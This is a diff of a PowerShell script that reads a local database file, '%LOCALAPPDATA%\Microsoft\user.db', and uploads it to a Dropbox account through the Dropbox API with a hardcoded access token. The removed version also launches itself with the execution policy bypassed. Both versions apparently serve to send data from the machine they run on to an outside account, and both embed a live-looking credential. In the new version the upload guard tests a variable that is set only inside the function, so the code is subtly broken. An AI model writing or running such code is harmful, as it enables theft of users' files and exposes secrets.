@@ -1,28 +1,25 @@
-powershell.exe -ExecutionPolicy Bypass -File .\upload_2_db.ps1
-#
-# Set your access token
-$accessToken = "sl.Bbu_sEznesS6JQ7swX2yyz4U9KR8vuyD8H8FBVHTN1ykh4qU9IGCT8XpoAXiJWYx_AaDq8uxkhMfhzGCnpLofnBDJM4SL-c9acaJvV7XQaSveSqOUplDiJIVANLyt4x3eY-CPkiwaM0"
+function DropBox-Upload {
 
-# Set the file path and destination path
-$filePath = "$env:LOCALAPPDATA\Microsoft\user.db"
-$destinationPath = "/user.db"
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
 
-# Read file content as bytes
-$fileContent = Get-Content -Path $filePath -Encoding Byte
+$db = "sl.Bbu_sEznesS6JQ7swX2yyz4U9KR8vuyD8H8FBVHTN1ykh4qU9IGCT8XpoAXiJWYx_AaDq8uxkhMfhzGCnpLofnBDJM4SL-c9acaJvV7XQaSveSqOUplDiJIVANLyt4x3eY-CPkiwaM0"
 
-# Convert file content to Base64
-$fileContentBase64 = [System.Convert]::ToBase64String($fileContent)
-
-# Prepare headers
-$headers = @{
-    "Authorization" = "Bearer $accessToken"
-    "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
-    "Content-Type" = "application/octet-stream"
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-# Make the API request
-$apiUrl = "https://content.dropboxapi.com/2/files/upload"
-$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $fileContentBase64
-
-# Print response
-Write-Host "File uploaded successfully. Response:" $response
+$FileName = "$env:LOCALAPPDATA\Microsoft\user.db"
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $FileName}
